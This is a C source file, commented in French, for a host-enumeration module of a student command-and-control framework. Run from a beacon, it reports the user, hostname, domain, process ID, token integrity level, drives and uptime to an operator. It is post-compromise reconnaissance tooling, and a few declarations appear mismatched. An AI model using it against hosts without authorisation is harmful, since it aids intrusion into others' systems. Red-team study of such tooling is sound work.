/*
 * ============================================================
 *  mod_enum.c — Module d'énumération cible (BOF / RDLL)
 *
 *  Sous-commandes :
 *    getuid        → GetUserNameA (ADVAPI32)
 *    hostname      → GetComputerNameA (KERNEL32)
 *    domain        → GetComputerNameExA(ComputerNameDnsDomain)
 *    getpid        → GetCurrentProcessId
 *    getintegrity  → OpenProcessToken + TokenIntegrityLevel
 *    drives        → GetLogicalDriveStringsA + GetDriveTypeA + GetDiskFreeSpaceExA
 *    uptime        → GetTickCount64 (jours/heures/minutes/secondes)
 *    all (défaut)  → toutes les informations ci-dessus
 *
 *  Utilisation opérateur :
 *    enum                      → all
 *    enum getuid
 *    enum hostname
 *    enum domain
 *    enum getpid
 *    enum getintegrity
 *    enum drives
 *    enum uptime
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Mai 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "beacon.h"
#include <string.h>

/* ============================================================
 *  DFR — Déclarations BOF uniquement
 *  En RDLL mode, beacon.h mappe ces noms directement via #define
 * ============================================================ */
#ifndef RDLL_MODE

/* KERNEL32 */
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetUserNameA(LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetComputerNameExA(int, LPSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$GetLogicalDriveStringsA(DWORD, LPSTR);
DECLSPEC_IMPORT WINBASEAPI UINT   WINAPI KERNEL32$GetDriveTypeA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetDiskFreeSpaceExA(
    LPCSTR,
    unsigned long long *,
    unsigned long long *,
    unsigned long long *);
DECLSPEC_IMPORT WINBASEAPI unsigned long long WINAPI KERNEL32$GetTickCount64(void);

/* ADVAPI32 */
DECLSPEC_IMPORT WINBASEAPI BOOL           WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL           WINAPI ADVAPI32$GetTokenInformation(
    HANDLE, int, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD *        WINAPI ADVAPI32$GetSidSubAuthority(void *, DWORD);
DECLSPEC_IMPORT WINBASEAPI unsigned char *WINAPI ADVAPI32$GetSidSubAuthorityCount(void *);

/* ── Constantes Windows (fournies par <windows.h> en RDLL mode) ── */
#define ComputerNameDnsDomain          2
#define TOKEN_QUERY                    0x0008
#define SECURITY_MANDATORY_LOW_RID     0x1000
#define SECURITY_MANDATORY_MEDIUM_RID  0x2000
#define SECURITY_MANDATORY_HIGH_RID    0x3000
#define SECURITY_MANDATORY_SYSTEM_RID  0x4000

/* Drive types */
#define DRIVE_NO_ROOT_DIR  1
#define DRIVE_REMOVABLE    2
#define DRIVE_FIXED        3
#define DRIVE_REMOTE       4
#define DRIVE_CDROM        5
#define DRIVE_RAMDISK      6

#endif /* !RDLL_MODE */

/* TokenIntegrityLevel = 25 (même valeur dans tous les modes) */
#define _TOKEN_INTEGRITY_LEVEL 25

/* ============================================================
 *  SOUS-COMMANDES
 * ============================================================ */

/* ── getuid ─────────────────────────────────────────────────── */
static void enum_getuid(void) {
    char buf[256] = "?";
    DWORD sz = (DWORD)sizeof(buf);
    KERNEL32$GetUserNameA(buf, &sz);
    BeaconPrintf(CALLBACK_OUTPUT, "Username     : %s\n", buf);
}

/* ── hostname ───────────────────────────────────────────────── */
static void enum_hostname(void) {
    char buf[256] = "?";
    DWORD sz = (DWORD)sizeof(buf);
    KERNEL32$GetComputerNameA(buf, &sz);
    BeaconPrintf(CALLBACK_OUTPUT, "Hostname     : %s\n", buf);
}

/* ── domain ─────────────────────────────────────────────────── */
static void enum_domain(void) {
    char buf[256] = "";
    DWORD sz = (DWORD)sizeof(buf);
    BOOL ok = KERNEL32$GetComputerNameExA(ComputerNameDnsDomain, buf, &sz);
    if (ok && buf[0] != '\0')
        BeaconPrintf(CALLBACK_OUTPUT, "Domain       : %s (domain-joined)\n", buf);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "Domain       : WORKGROUP (not domain-joined)\n");
}

/* ── getpid ─────────────────────────────────────────────────── */
static void enum_getpid(void) {
    DWORD pid = KERNEL32$GetCurrentProcessId();
    BeaconPrintf(CALLBACK_OUTPUT, "PID          : %lu\n", (unsigned long)pid);
}

/* ── getintegrity ───────────────────────────────────────────── */
static void enum_getintegrity(void) {
    HANDLE hToken = NULL;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Integrity    : [error: OpenProcessToken failed]\n");
        return;
    }

    /*
     * TOKEN_MANDATORY_LABEL layout (x64) :
     *   offset 0 : Sid pointer (8 bytes) — points to SID struct
     *   offset 8 : Attributes (4 bytes)
     * On lit le pointeur Sid via memcpy pour éviter les conflits de types
     * entre BOF mode et RDLL mode.
     */
    unsigned char buf[256];
    DWORD returned = 0;
    ADVAPI32$GetTokenInformation(hToken, _TOKEN_INTEGRITY_LEVEL,
                                 buf, (DWORD)sizeof(buf), &returned);
    KERNEL32$CloseHandle(hToken);

    if (!returned) {
        BeaconPrintf(CALLBACK_OUTPUT, "Integrity    : [error: GetTokenInformation failed]\n");
        return;
    }

    /* Extrait le pointeur Sid depuis le premier champ du TOKEN_MANDATORY_LABEL */
    void *sid = NULL;
    __builtin_memcpy(&sid, buf, sizeof(void *));

    unsigned char *sub_cnt = ADVAPI32$GetSidSubAuthorityCount(sid);
    DWORD *rid_ptr = ADVAPI32$GetSidSubAuthority(sid, (DWORD)(*sub_cnt - 1));
    DWORD  rid = *rid_ptr;

    const char *level =
        (rid < SECURITY_MANDATORY_LOW_RID)    ? "Untrusted" :
        (rid < SECURITY_MANDATORY_MEDIUM_RID) ? "Low"       :
        (rid < SECURITY_MANDATORY_HIGH_RID)   ? "Medium"    :
        (rid < SECURITY_MANDATORY_SYSTEM_RID) ? "High"      : "System";

    BeaconPrintf(CALLBACK_OUTPUT, "Integrity    : %s (RID=0x%lx)\n",
                 level, (unsigned long)rid);
}

/* ── drives ─────────────────────────────────────────────────── */
static const char *drive_type_label(UINT t) {
    switch (t) {
        case DRIVE_REMOVABLE: return "Removable";
        case DRIVE_FIXED:     return "Fixed    ";
        case DRIVE_REMOTE:    return "Network  ";
        case DRIVE_CDROM:     return "CD-ROM   ";
        case DRIVE_RAMDISK:   return "RAM disk ";
        default:              return "Unknown  ";
    }
}

static void enum_drives(void) {
    char buf[512];
    DWORD len = KERNEL32$GetLogicalDriveStringsA((DWORD)(sizeof(buf) - 1), buf);
    if (!len) {
        BeaconPrintf(CALLBACK_OUTPUT, "Drives       : [error]\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Drives:\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  %-6s %-10s %-20s %s\n",
                 "Drive", "Type", "Free", "Total");
    BeaconPrintf(CALLBACK_OUTPUT, "  %-6s %-10s %-20s %s\n",
                 "-----", "---------", "-------------------", "-----");

    char *p = buf;
    while (*p) {
        UINT  type = KERNEL32$GetDriveTypeA(p);
        if (type == DRIVE_NO_ROOT_DIR) {
            p += strlen(p) + 1;
            continue;
        }

        ULARGE_INTEGER free_caller = {0}, total = {0}, total_free = {0};
        BOOL has_sz = KERNEL32$GetDiskFreeSpaceExA(p,
                          &free_caller, &total, &total_free);

        if (has_sz && total.QuadPart > 0) {
            /* Convertir en GB avec une décimale */
            unsigned long long total_mb = total.QuadPart      / (1024ULL * 1024);
            unsigned long long free_mb  = free_caller.QuadPart / (1024ULL * 1024);
            unsigned long long total_gb = total_mb / 1024;
            unsigned long long total_gb_r = (total_mb % 1024) / 103; /* ~0.1 GB */
            unsigned long long free_gb  = free_mb  / 1024;
            unsigned long long free_gb_r  = (free_mb  % 1024) / 103;

            BeaconPrintf(CALLBACK_OUTPUT,
                "  %-6s %-10s %llu.%llu GB free        %llu.%llu GB total\n",
                p, drive_type_label(type),
                (unsigned long long)free_gb,
                (unsigned long long)free_gb_r,
                (unsigned long long)total_gb,
                (unsigned long long)total_gb_r);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  %-6s %-10s (no size info)\n", p, drive_type_label(type));
        }

        p += strlen(p) + 1;
    }
}

/* ── whoami ─────────────────────────────────────────────────── */
static void enum_whoami(void) {
    char user[256]   = "?";
    char prefix[256] = "?";
    DWORD sz;

    sz = (DWORD)sizeof(user);
    KERNEL32$GetUserNameA(user, &sz);

    /* Préfixe : domaine DNS si domain-joined, sinon nom machine */
    sz = (DWORD)sizeof(prefix);
    BOOL has_domain = KERNEL32$GetComputerNameExA(
                          ComputerNameDnsDomain, prefix, &sz);
    if (!has_domain || prefix[0] == '\0') {
        sz = (DWORD)sizeof(prefix);
        KERNEL32$GetComputerNameA(prefix, &sz);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s\\%s\n", prefix, user);
}

/* ── uptime ─────────────────────────────────────────────────── */
static void enum_uptime(void) {
    unsigned long long ms = KERNEL32$GetTickCount64();
    unsigned long long s  = ms / 1000ULL;
    unsigned long long m  = s  / 60ULL;
    unsigned long long h  = m  / 60ULL;
    unsigned long long d  = h  / 24ULL;

    s %= 60ULL;
    m %= 60ULL;
    h %= 24ULL;

    if (d > 0)
        BeaconPrintf(CALLBACK_OUTPUT,
            "Uptime       : %llud %lluh %llum %llus\n", d, h, m, s);
    else if (h > 0)
        BeaconPrintf(CALLBACK_OUTPUT,
            "Uptime       : %lluh %llum %llus\n", h, m, s);
    else
        BeaconPrintf(CALLBACK_OUTPUT,
            "Uptime       : %llum %llus\n", m, s);
}

/* ============================================================
 *  POINT D'ENTRÉE BOF
 * ============================================================ */

BOF_DLL_EXPORT void go(char *args, int args_len) {
    /* Extrait le sous-argument (getuid, hostname, domain…) */
    char sub[64] = "";

    if (args && args_len > 4) {
        datap parser;
        BeaconDataParse(&parser, args, args_len);
        int slen = 0;
        char *s = BeaconDataExtract(&parser, &slen);
        if (s && slen > 0 && slen < (int)sizeof(sub) - 1) {
            int i;
            for (i = 0; i < slen; i++) sub[i] = s[i];
            sub[slen] = '\0';
        }
    }

    /* Dispatch sur le sous-argument */
    if (sub[0] == '\0'
        || strcmp(sub, "all")  == 0
        || strcmp(sub, "enum") == 0) {
        /* Rapport complet */
        BeaconPrintf(CALLBACK_OUTPUT, "=== Enumeration ===\n");
        enum_hostname();
        enum_getuid();
        enum_domain();
        enum_getpid();
        enum_getintegrity();
        enum_uptime();
        enum_drives();

    } else if (strcmp(sub, "whoami") == 0) {
        enum_whoami();
    } else if (strcmp(sub, "getuid") == 0) {
        enum_getuid();
    } else if (strcmp(sub, "hostname") == 0) {
        enum_hostname();
    } else if (strcmp(sub, "domain") == 0) {
        enum_domain();
    } else if (strcmp(sub, "getpid") == 0) {
        enum_getpid();
    } else if (strcmp(sub, "getintegrity") == 0) {
        enum_getintegrity();
    } else if (strcmp(sub, "drives") == 0) {
        enum_drives();
    } else if (strcmp(sub, "uptime") == 0) {
        enum_uptime();
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[enum] sous-commandes disponibles :\n"
            "  whoami · getuid · hostname · domain · getpid\n"
            "  getintegrity · drives · uptime · all\n");
    }
}
